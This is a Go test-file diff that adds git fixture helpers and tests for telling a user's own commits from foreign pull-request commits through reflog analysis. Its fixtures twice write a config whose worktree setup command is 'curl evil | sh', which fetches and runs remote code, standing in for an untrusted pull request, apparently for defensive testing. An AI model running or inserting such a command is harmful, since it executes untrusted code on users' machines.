@@ -59,6 +59,25 @@ func (f *fixture) git(dir string, args ...string) string {
 	return out
 }
 
+// gitAt runs git with the committer date daysAgo days back. That date stamps the reflog entry
+// the command writes; the author date of a new commit stays now, as in daily use.
+func (f *fixture) gitAt(daysAgo int, dir string, args ...string) string {
+	f.t.Helper()
+	return f.gitWhen(time.Now().Add(-time.Duration(daysAgo)*24*time.Hour), dir, args...)
+}
+
+// gitWhen runs git with the committer date when.
+func (f *fixture) gitWhen(when time.Time, dir string, args ...string) string {
+	f.t.Helper()
+	g := f.g
+	g.Env = append(slices.Clone(f.g.Env), "GIT_COMMITTER_DATE="+when.Format(time.RFC3339))
+	out, err := g.run(context.Background(), dir, args...)
+	if err != nil {
+		f.t.Fatalf("git %v: %v", args, err)
+	}
+	return out
+}
+
 func (f *fixture) write(dir, rel, body string) {
 	f.t.Helper()
 	p := filepath.Join(dir, rel)
@@ -271,7 +290,9 @@ func prFixture(t *testing.T) (f *fixture, identity, pr string) {
 	f = newFixture(t)
 	origin := f.remote("origin")
 	other := filepath.Join(filepath.Dir(f.root), "contributor")
-	f.git(filepath.Dir(f.root), "clone", "-q", origin, other)
+	// -b main: the bare origin's HEAD names no branch, and a clone without it would make the
+	// pull request a root commit instead of a child of main.
+	f.git(filepath.Dir(f.root), "clone", "-q", "-b", "main", origin, other)
 	f.write(other, "flightdeck.json", `{"worktree":{"setup":"curl evil | sh"}}`)
 	f.git(other, "add", "flightdeck.json")
 	f.git(other, "commit", "-q", "-m", "pr")
@@ -389,6 +410,104 @@ func TestReflogRuleBounds(t *testing.T) {
 	}
 }
 
+// TestR3OwnAmendTimeGaps: an own commit amended days later stays own, though git lists the
+// branch's and HEAD's reflog entries interleaved by date.
+func TestR3OwnAmendTimeGaps(t *testing.T) {
+	f, identity, _ := prFixture(t)
+	f.gitAt(5, f.repo, "checkout", "-q", "-b", "mine", "origin/main")
+	f.gitAt(4, f.repo, "commit", "-q", "--allow-empty", "-m", "mine")
+	f.gitAt(3, f.repo, "commit", "-q", "--allow-empty", "--amend", "-m", "mine amended")
+	f.gitAt(2, f.repo, "checkout", "-q", "main")
+	if c, err := f.create(CreateOptions{Branch: "mine", Remote: identity}); err != nil || c.Foreign != "" {
+		t.Fatalf("an own commit amended later: %+v %v", c, err)
+	}
+}
+
+// expireGap checks out the pull request 40 days ago in dir, amends it 10 days ago, and runs the
+// reflog expiry gc runs, which drops the checkout entry. The amend's next older entry is then
+// an origin/main commit. It returns the amended commit and checks that the gap is real.
+func expireGap(t *testing.T, f *fixture, dir, logRef, pr string) string {
+	t.Helper()
+	f.gitAt(45, dir, "checkout", "-q", "--detach", "origin/main")
+	f.gitAt(40, dir, "checkout", "-q", "--detach", pr)
+	f.gitAt(10, dir, "commit", "-q", "--amend", "-m", "reworded")
+	a := f.git(dir, "rev-parse", "HEAD")
+	f.git(f.repo, "reflog", "expire", "--expire=90.days.ago", "--expire-unreachable=30.days.ago", "--all")
+	if log := f.git(f.repo, "reflog", "show", "--format=%H", logRef); strings.Contains(log, pr) {
+		t.Fatalf("the expiry kept the pull request's checkout entry:\n%s", log)
+	}
+	return a
+}
+
+// TestR3ExpireGapLinked: after gc's expiry, an amended pull request in a linked worktree stays
+// foreign: the amend's surviving older entry has other parents.
+func TestR3ExpireGapLinked(t *testing.T) {
+	f, identity, pr := prFixture(t)
+	f.git(f.repo, "fetch", "-q", "origin", "refs/pull/7/head")
+	det := filepath.Join(f.root, "det")
+	f.git(f.repo, "worktree", "add", "-q", "--detach", det, "origin/main")
+	a := expireGap(t, f, det, "worktrees/det/HEAD", pr)
+	if c, err := f.create(CreateOptions{Branch: "b", Base: a, Remote: identity}); err != nil || c.Foreign == "" {
+		t.Fatalf("an amended pull request after the expiry: %+v %v", c, err)
+	}
+}
+
+// TestR3ExpireGapDetached is TestR3ExpireGapLinked on the main worktree's detached HEAD.
+func TestR3ExpireGapDetached(t *testing.T) {
+	f, identity, pr := prFixture(t)
+	f.git(f.repo, "fetch", "-q", "origin", "refs/pull/7/head")
+	a := expireGap(t, f, f.repo, "HEAD", pr)
+	f.git(f.repo, "checkout", "-q", "main")
+	if c, err := f.create(CreateOptions{Branch: "b", Base: a, Remote: identity}); err != nil || c.Foreign == "" {
+		t.Fatalf("an amended pull request after the expiry: %+v %v", c, err)
+	}
+}
+
+// TestR3Cycle: --no-edit amends in one second make the same commit again, a self cycle in the
+// amend entries. A pull request amended that way is foreign within a second; an own commit is
+// own.
+func TestR3Cycle(t *testing.T) {
+	f, _, pr := prFixture(t)
+	f.git(f.repo, "fetch", "-q", "origin", "refs/pull/7/head")
+	trusted := []string{"refs/remotes/origin/main"}
+	check := func(name, commit string, want bool) {
+		t.Helper()
+		ctx, cancel := context.WithTimeout(context.Background(), time.Second)
+		defer cancel()
+		if got := f.g.committedHere(ctx, f.repo, commit, trusted); got != want || ctx.Err() != nil {
+			t.Fatalf("%s: own %v, want %v (deadline: %v)", name, got, want, ctx.Err())
+		}
+	}
+	f.git(f.repo, "checkout", "-q", "-b", "am", pr)
+	f.git(f.repo, "commit", "-q", "--amend", "-m", "x")
+	for range 4 {
+		f.git(f.repo, "commit", "-q", "--amend", "--no-edit")
+	}
+	tip := f.git(f.repo, "rev-parse", "HEAD")
+	if idx := f.g.readReflogs(context.Background(), f.repo); slices.Contains(idx.amendOf[tip], tip) {
+		t.Fatal("an amend lists itself as the commit it replaced")
+	}
+	check("a pull request amended with --no-edit", tip, false)
+
+	// Amends that go back and forth between three messages, at one committer date, make the
+	// same three commits again and again: each lists the other two as replaced, a cycle with a
+	// fan-out of two at every step. Without the memo the depth bound alone allows 2^8 checks.
+	when := time.Now().Add(-time.Hour)
+	f.git(f.repo, "checkout", "-q", "-b", "fan", pr)
+	for _, m := range strings.Fields("x y x z x y z y x z y z x") {
+		f.gitWhen(when, f.repo, "commit", "-q", "--amend", "-m", m)
+	}
+	check("a pull request amended back and forth", f.git(f.repo, "rev-parse", "HEAD"), false)
+
+	f.git(f.repo, "checkout", "-q", "-b", "own", "origin/main")
+	f.git(f.repo, "commit", "-q", "--allow-empty", "-m", "own")
+	for range 4 {
+		f.git(f.repo, "commit", "-q", "--allow-empty", "--amend", "--no-edit")
+	}
+	check("an own commit amended with --no-edit", f.git(f.repo, "rev-parse", "HEAD"), true)
+	f.git(f.repo, "checkout", "-q", "main")
+}
+
 func TestForeignPullRequestPaths(t *testing.T) {
 	f := newFixture(t)
 	origin := f.remote("origin")
@@ -397,7 +516,7 @@ func TestForeignPullRequestPaths(t *testing.T) {
 	// A commit only the fork has, made in someone else's clone, so this repository's reflog
 	// never saw it committed.
 	other := filepath.Join(filepath.Dir(f.root), "other")
-	f.git(filepath.Dir(f.root), "clone", "-q", fork, other)
+	f.git(filepath.Dir(f.root), "clone", "-q", "-b", "main", fork, other)
 	f.write(other, "flightdeck.json", `{"worktree":{"setup":"curl evil | sh"}}`)
 	f.git(other, "add", "flightdeck.json")
 	f.git(other, "commit", "-q", "-m", "pr")
